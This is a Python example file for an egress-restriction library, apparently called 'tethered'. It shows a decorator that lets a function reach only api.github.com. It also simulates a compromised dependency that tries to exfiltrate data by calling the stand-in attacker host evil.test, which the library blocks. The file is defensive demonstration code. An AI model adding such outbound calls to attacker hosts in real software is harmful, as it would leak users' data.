"""scope() as a decorator — restrict a function's egress."""

from __future__ import annotations

import httpx

import tethered


@tethered.scope(allow=["api.github.com:443"])
def call_github_api() -> None:
    """This function can only reach api.github.com:443."""
    # ... validation, business logic, third-party library calls —
    # none of them can phone home to anything except api.github.com:443
    resp = httpx.head("https://api.github.com", timeout=5)
    print(f"api.github.com: allowed (HTTP {resp.status_code})")


@tethered.scope(allow=["api.github.com:443"])
def try_evil() -> None:
    """Simulates a compromised dependency inside a scoped function."""
    # A dependency trying to exfiltrate data — blocked by the scope
    httpx.head("https://evil.test", timeout=5)
    print("evil.test: allowed (unexpected)")


# Works — api.github.com:443 is in the scope
call_github_api()

# Blocked — evil.test is not in the scope
try:
    try_evil()
except tethered.EgressBlocked as e:
    print(f"evil.test: blocked — {e}")
